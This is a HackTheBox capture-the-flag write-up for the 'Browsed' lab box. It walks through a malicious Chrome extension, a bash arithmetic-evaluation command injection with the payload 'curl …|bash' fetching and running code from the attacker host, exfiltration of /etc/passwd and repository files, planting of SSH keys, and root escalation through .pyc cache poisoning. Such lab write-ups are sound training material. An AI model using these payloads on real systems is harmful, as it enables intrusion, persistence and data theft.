# Browsed — HackTheBox Writeup

## Box Info

| | |
|---|---|
| **Name** | Browsed |
| **IP** | 10.129.244.79 |
| **OS** | Ubuntu Linux |
| **Difficulty** | Medium |
| **User Flag** | `18743a6a8c6e560846782d46205fdc5e` |
| **Root Flag** | `1f036d0839072a19df5af0397076e460` |

---

## Reconnaissance

Full TCP scan reveals two open ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

The web application at port 80 is a company site called "Browsed" (`browsed.htb`) focused on browser extensions. Three pages stand out:

- **`/`** — Landing page mentioning Chrome version 134 extensions
- **`/samples.html`** — Three downloadable sample extensions (Fontify, ReplaceImages, Timer)
- **`/upload.php`** — Upload form accepting `.zip` Chrome extensions

The upload page states: *"A developer will use it and reach back with some feedback."* A `pollOutput()` JavaScript function fetches results from `upload.php?output=1`, indicating the server loads uploaded extensions into a real Chrome instance and captures output.

---

## Initial Access — Malicious Chrome Extension + Bash Arithmetic Eval RCE

### Step 1: Building a Malicious Extension

Downloading a sample extension reveals the expected format — Manifest V3 with content scripts. I crafted a malicious extension with a background service worker that fires on install:

**manifest.json:**
```json
{
  "manifest_version": 3,
  "name": "Fontify Plus",
  "version": "1.0.0",
  "description": "Enhanced font switcher for all websites",
  "permissions": ["storage", "scripting"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_idle"
  }]
}
```

### Step 2: Reconnaissance via Extension

The first upload leaked the Chrome command line in the HTTP response:

```
timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
  --load-extension="/tmp/extension_..." \
  --enable-logging=stderr --v=1 \
  http://localhost/ http://browsedinternals.htb
```

Key observations:
- Chrome runs with `--no-sandbox`
- It navigates to **`http://browsedinternals.htb`** — an internal virtual host
- Console output is captured via `--enable-logging=stderr --v=1`

Subsequent extensions used `fetch()` from the background service worker to enumerate:

- **`file:///etc/passwd`** — Readable, confirmed user `larry` (uid 1000) and `git` (uid 110)
- **`http://127.0.0.1:3000`** — **Gitea 1.24.5** instance (`browsedinternals.htb`)
- **`http://127.0.0.1:5000`** — Flask application (Markdown Previewer)

Chrome's verbose logging truncates console output, so I switched to network exfiltration — the extension POSTed file contents to a Python HTTP listener on the attack box.

### Step 3: Discovering the Internal Flask App

The Gitea API revealed a single user **`larry`** with a public repository **`larry/MarkdownPreview`**. Exfiltrating the repo contents exposed:

**app.py** — Flask app on port 5000 with a critical endpoint:

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

**routines.sh** — Bash script using arithmetic comparison:

```bash
if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  ...
elif [[ "$1" -eq 1 ]]; then
  ...
```

### Step 4: Bash Arithmetic Evaluation RCE

The vulnerability is in bash's `[[ "$1" -eq 0 ]]` construct. When `-eq` is used inside `[[ ]]`, bash evaluates both operands as **arithmetic expressions** (documented in `man bash` under ARITHMETIC EVALUATION). This means command substitutions like `$(cmd)` within the operand are executed.

The `subprocess.run(["./routines.sh", rid])` call passes `rid` as a single argument without shell interpretation — but bash's arithmetic evaluator re-interprets it.

**Payload:** `a[$(curl 10.10.14.91:9999|bash)]`

When bash evaluates `[[ "a[$(curl 10.10.14.91:9999|bash)]" -eq 0 ]]`, it interprets `a` as a variable name and `[$(curl ...)]` as an array subscript — triggering command substitution within the subscript expression.

**Critical constraint:** The payload travels through a Flask URL path (`/routines/<rid>`), so it cannot contain forward slashes (`/`) — Flask interprets `%2F` as a path separator. The payload `curl 10.10.14.91:9999|bash` avoids slashes entirely; the fetched shell script can contain them freely.

The extension calls the Flask endpoint with the URL-encoded payload:

```javascript
fetch("http://127.0.0.1:5000/routines/a%5B%24%28curl%2010.10.14.91%3A9999%7Cbash%29%5D");
```

The attack box serves a shell script on any GET request:

```bash
#!/bin/bash
mkdir -p $HOME/.ssh
echo 'ssh-ed25519 AAAAC3NzaC...' >> $HOME/.ssh/authorized_keys
chmod 700 $HOME/.ssh
chmod 600 $HOME/.ssh/authorized_keys
```

Two-step delivery: the extension first calls the routines endpoint with `a[$(curl -o .x.sh 10.10.14.91:9999)]` to download, then `a[$(bash .x.sh)]` to execute.

```
$ ssh -i browsed_key larry@10.129.244.79
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

**User flag:** `18743a6a8c6e560846782d46205fdc5e`

---

## Privilege Escalation — Python .pyc Cache Poisoning

### Enumeration

```
$ sudo -l
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

The script (`extension_tool.py`) is a Python 3.12 tool for validating, versioning, and packaging Chrome extensions. It imports a local module:

```python
from extension_utils import validate_manifest, clean_temp_files
```

Directory permissions:

```
drwxr-xr-x  /opt/extensiontool/
-rwxrwxr-x  extension_tool.py      (root:root)
-rw-rw-r--  extension_utils.py     (root:root)
drwxrwxrwx  __pycache__/           (root:root) ← WORLD-WRITABLE
```

Larry cannot modify the source files (owned by root:root, larry not in root group), but the `__pycache__` directory is **world-writable**.

### The Attack

Python caches compiled `.pyc` files in `__pycache__/`. When importing a module, Python checks if a valid `.pyc` exists with a matching source timestamp — if so, it loads the cached bytecode instead of recompiling from source.

The `.pyc` header format (Python 3.8+):

| Offset | Size | Field |
|--------|------|-------|
| 0 | 4 | Magic number (version-specific) |
| 4 | 4 | Flags (0 = timestamp-based invalidation) |
| 8 | 4 | Source file mtime (little-endian uint32) |
| 12 | 4 | Source file size (little-endian uint32) |
| 16 | ... | Marshaled code object |

I needed:
1. The source file's mtime: `2025-03-23 10:56:19 UTC` (epoch `1742727379`)
2. The source file's size: `1245` bytes
3. Python 3.12's magic number: `0xcb0d0d0a`

The malicious module plants an SSH key for root while still providing the expected `validate_manifest()` and `clean_temp_files()` functions so the tool runs cleanly:

```python
import os, subprocess
pubkey = "ssh-ed25519 AAAAC3NzaC..."
os.makedirs("/root/.ssh", mode=0o700, exist_ok=True)
with open("/root/.ssh/authorized_keys", "a") as f:
    f.write(pubkey + "\n")
os.chmod("/root/.ssh/authorized_keys", 0o600)

# ... original functions so the tool doesn't crash ...
def validate_manifest(path): ...
def clean_temp_files(extension_dir): ...
```

The `.pyc` must be compiled on the target to match the exact Python 3.12.3 marshal format:

```python
import struct, marshal, importlib.util
code = compile(malicious_code, "extension_utils.py", "exec")
magic = importlib.util.MAGIC_NUMBER
pyc = magic + struct.pack('<III', 0, source_mtime, source_size) + marshal.dumps(code)
```

```bash
larry$ python3.12 /tmp/gen_pyc.py
[+] Written 2448 bytes to /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc

larry$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[+] Manifest is valid.
[-] Skipping version bumping
[-] Skipping packaging
```

Python loaded the poisoned cache, executing as root. SSH key planted:

```
$ ssh -i browsed_key root@10.129.244.79
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:** `1f036d0839072a19df5af0397076e460`

---

## Summary

| Phase | Technique | Key Detail |
|-------|-----------|------------|
| Recon | Port scan, web enum | Chrome extension upload portal |
| Foothold | Malicious Chrome extension | Service worker exfiltrates internal services via `fetch()` |
| Lateral | Bash arithmetic evaluation | `[[ "$1" -eq 0 ]]` evaluates `$(cmd)` in array subscripts |
| Privesc | Python .pyc cache poisoning | World-writable `__pycache__/` + sudo python script |
